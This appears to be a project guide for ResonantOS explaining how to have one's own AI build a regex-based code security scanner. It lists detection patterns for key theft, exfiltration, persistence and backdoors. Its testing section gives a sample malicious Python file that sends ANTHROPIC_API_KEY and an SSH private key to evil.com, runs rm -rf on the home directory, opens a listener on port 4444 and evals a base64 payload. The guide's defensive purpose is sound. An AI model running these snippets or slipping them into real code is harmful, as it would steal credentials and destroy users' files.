# Build Your Own Shield

**A guide to creating your own code security scanner — no trust required.**

---

## Why This Document Exists

You want to install ResonantOS (or any open-source AI toolkit). But how do you know the code is safe?

You could download our Shield scanner — but then you'd have to trust that OUR scanner isn't compromised. That's circular.

**Solution:** Build your own scanner using this document and YOUR OWN AI. You trust your AI. Your AI builds the scanner. Your scanner verifies our code.

Trust chain: **You → Your AI → Your Shield → Our Code**

---

## What Your Shield Will Detect

Your basic Shield will scan code for these dangerous patterns:

### 1. API Key Theft
Code that extracts API keys from environment variables, config files, or keychains and sends them elsewhere.

**Red flags:**
- Reading from `~/.clawdbot/`, `~/.config/`, `~/.aws/`, `~/.ssh/`
- Accessing environment variables like `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`
- Sending data to external URLs after reading sensitive files

### 2. Data Exfiltration
Code that collects personal data and transmits it to external servers.

**Red flags:**
- Reading browser history, cookies, or saved passwords
- Accessing contacts, messages, or photos
- HTTP/HTTPS requests to unknown domains after reading local files
- Base64 encoding of file contents before transmission

### 3. Destructive Operations
Code that deletes, encrypts, or corrupts files.

**Red flags:**
- `rm -rf` on home directory or system paths
- File operations on paths outside the project directory
- Encryption of user files (ransomware pattern)
- Modification of system files (`/etc/`, `/usr/`, `~/Library/`)

### 4. Hidden Execution
Code that runs secretly or persists without user knowledge.

**Red flags:**
- Creating launch agents/daemons (`~/Library/LaunchAgents/`)
- Modifying shell profiles (`.bashrc`, `.zshrc`)
- Background processes that survive terminal close
- Cron job installation

### 5. Network Backdoors
Code that opens network access for remote control.

**Red flags:**
- Opening server ports
- Reverse shell patterns
- WebSocket connections to unknown hosts
- SSH key injection

### 6. Obfuscation
Code that hides its true intent.

**Red flags:**
- Base64-encoded strings that decode to commands
- `eval()` on dynamically constructed strings
- Minified/obfuscated code in a project that's otherwise readable
- Unicode tricks to hide characters

---

## How to Build Your Shield

Give your AI (Claude, GPT, or any you trust) these instructions:

---

### Instructions for Your AI

**Task:** Build a code security scanner based on the threat patterns above.

**Requirements:**

1. **Language:** Python 3.9+ (standard library only — no external dependencies to audit)

2. **Input:** Path to a directory containing code to scan

3. **Output:** JSON report with:
   - `status`: "clean" or "flagged"
   - `findings`: Array of detected issues
   - Each finding has: `file`, `line`, `pattern`, `severity`, `description`

4. **Scanning approach:**
   - Recursively scan all files in the directory
   - Focus on: `.py`, `.js`, `.ts`, `.sh`, `.bash`, `.zsh`, `.rb`, `.go`, `.rs`, `.swift`
   - Also check: `package.json`, `requirements.txt`, `Makefile`, config files
   - Skip: `node_modules/`, `venv/`, `.git/`, binary files

5. **Pattern detection:**
   - Use regex patterns for each threat category
   - Flag suspicious patterns, don't just keyword match
   - Consider context (e.g., `rm` in a cleanup script vs. `rm -rf ~/`)

6. **Severity levels:**
   - `critical`: Immediate danger (data exfiltration, key theft)
   - `high`: Destructive potential (file deletion, system modification)
   - `medium`: Suspicious but may be legitimate (network calls, file access)
   - `low`: Worth noting (obfuscation, unusual patterns)

7. **Output format example:**
```json
{
  "status": "flagged",
  "scanned_files": 142,
  "findings": [
    {
      "file": "src/sync.py",
      "line": 47,
      "pattern": "api_key_exfiltration",
      "severity": "critical",
      "description": "Reads ANTHROPIC_API_KEY and sends to external URL",
      "code_snippet": "requests.post(url, data={'key': os.environ['ANTHROPIC_API_KEY']})"
    }
  ]
}
```

8. **False positive handling:**
   - Include the actual code snippet so humans can verify
   - Don't auto-block, just report
   - User makes final decision

---

### After Your AI Builds It

1. **Read the code yourself** — It should be ~200-400 lines of readable Python
2. **Verify it matches the patterns above** — Your AI should have implemented each threat check
3. **Run it on a test directory** — Make sure it executes without errors
4. **Test with known-bad code** — Create a test file with obvious threats, verify it catches them

---

## Testing Your Shield (Critical Step)

Before trusting your Shield to verify ResonantOS, you MUST test it.

### Step 1: Ask Your AI to Generate Malicious Code

Give your AI this prompt:

> "Create a Python file with intentionally malicious code patterns for testing my security scanner. Include examples of: API key theft, data exfiltration, destructive operations (rm -rf), persistence mechanisms (LaunchAgents), network backdoors, and obfuscated code execution. Make it obviously malicious so I can verify my scanner catches it."

Your AI will generate something like this:

```python
# test_malicious.py — YOUR SHIELD SHOULD FLAG ALL OF THESE

import os
import requests
import base64

# 1. API Key Theft
api_key = os.environ.get('ANTHROPIC_API_KEY')
requests.post('https://evil.com/steal', data={'key': api_key})

# 2. Data Exfiltration
with open(os.path.expanduser('~/.ssh/id_rsa'), 'r') as f:
    ssh_key = base64.b64encode(f.read().encode()).decode()
    requests.post('https://evil.com/keys', data={'ssh': ssh_key})

# 3. Destructive Operations
os.system('rm -rf ~/')

# 4. Hidden Execution
with open(os.path.expanduser('~/Library/LaunchAgents/evil.plist'), 'w') as f:
    f.write('<plist>...</plist>')

# 5. Network Backdoor
import socket
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)

# 6. Obfuscation
eval(base64.b64decode('cHJpbnQoIm93bmVkIik=').decode())
```

**Expected result:** Your Shield should flag ALL 6 patterns with `critical` or `high` severity.

### Step 2: Iterate Until Confident

If your Shield misses something:

1. **Identify the gap** — Which pattern wasn't detected?
2. **Ask your AI to improve it** — "My scanner missed [pattern]. Add a regex to detect this."
3. **Re-test** — Run again until all threats are caught

Keep iterating until you're confident your Shield catches everything dangerous.

**You control the quality.** This isn't about trusting our scanner — it's about building one YOU trust.

### Step 3: When You're Ready

Only when your Shield passes all your tests:
- You understand what it detects
- You've tested it with malicious code
- You're confident it works

...then proceed to scan ResonantOS.

---

## Using Your Shield on ResonantOS

Once your Shield works:

1. Clone the ResonantOS repository
2. Run your Shield on the cloned directory
3. Review any findings
4. If clean (or findings are false positives you understand), proceed with install

```bash
# Example usage
git clone https://github.com/ManoloRemiddi/resonantos-open-system-toolkit.git
python your_shield.py ./resonantos-open-system-toolkit
```

---

## Adding Open-Source Antivirus (Optional but Recommended)

Your self-built Shield catches code-level threats. For extra confidence, add an open-source antivirus that's been battle-tested by millions:

### ClamAV Integration

[ClamAV](https://www.clamav.net/) is an open-source antivirus engine. It's:
- Used by millions (email servers, file scanners worldwide)
- Open source (you can read every line)
- Community-maintained (not controlled by us)

**Install ClamAV:**
```bash
# macOS
brew install clamav

# Update virus definitions
freshclam

# Scan a directory
clamscan -r ./resonantos-open-system-toolkit
```

**Why this helps:**
- ClamAV catches known malware signatures
- Your Shield catches AI/code-specific threats
- Together = comprehensive protection
- Neither requires trusting us

**Combined scan:**
```bash
# Run both scanners
clamscan -r ./code-to-check
python your_shield.py ./code-to-check
```

If both pass, you have:
1. ✅ Open-source AV verification (community trust)
2. ✅ Your own AI-built scanner (your trust)
3. ✅ Zero dependency on ResonantOS for verification

---

## What This Document Doesn't Cover

This builds a **basic** Shield — enough to catch obvious threats.

The full ResonantOS Symbiotic Shield includes:
- Real-time monitoring (not just one-time scan)
- Behavioral analysis (watching what code actually does)
- Network traffic inspection
- Sandboxed execution testing
- Continuous protection

But for verifying code before install? Your basic Shield is enough.

---

## Final Notes

- **You built it.** You know exactly what it does.
- **No trust required.** This document is auditable. Your AI did the work.
- **You're in control.** Your Shield, your rules, your verification.

This is what trustless security looks like.

---

*Document version: 1.0*
*Created: 2026-02-07*
